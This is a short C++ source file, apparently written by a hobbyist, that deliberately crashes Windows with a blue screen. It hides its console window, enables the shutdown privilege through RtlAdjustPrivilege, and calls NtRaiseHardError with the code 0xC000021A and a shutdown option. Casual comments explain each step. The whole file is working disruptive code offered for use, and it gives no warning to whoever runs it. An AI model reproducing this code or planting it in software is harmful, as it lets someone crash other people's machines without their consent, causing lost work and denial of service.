#include "RaiseHardError.h"

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE); //It prevents the cmd window from appearing for a reason. who could've thought showing it was a good idea?

    auto hNtdll = LoadLibraryA("ntdll.dll"); //Loads the kernel driver in order to be ready to load NtRaiseHardError or idk
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT; //When it is not loaded, it will free ntdll.dll, and do nothing.
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled; //RtlAdjustPrivilege will request to shut down the entire system, which means it calls "SeShutDownPrivilege" perm.
    if (RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED; //uhhh, it's the same I guess lol?
    }

    auto NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    FreeLibrary(hNtdll); //Loads the NtRaiseHardError
    
    //I don't know how to efficiently code C++, so the codes here are kinda messy. Please understand.
    ULONG_PTR parameters[1] = { 0 }; //These are just useless array variables. I'll find a way to clean these up later.
    parameters[0] = 0xC000021A; //It only defines the BSOD error code. The example code shown here is meaning "STATUS_SYSTEM_PROCESS_TERMINATED".
    ULONG_PTR parameterd[1] = { 0 };
    parameterd[0] = (ULONG_PTR)"HELP"; // This will set the custom text of the BSOD. but some codes will only work as most of them are hardcoded.
    HARDERROR_RESPONSE Response;


    //Let the show begin
    return NtRaiseHardError(parameters[0], 1, 0, parameterd, OptionShutdownSystem, &Response);
}
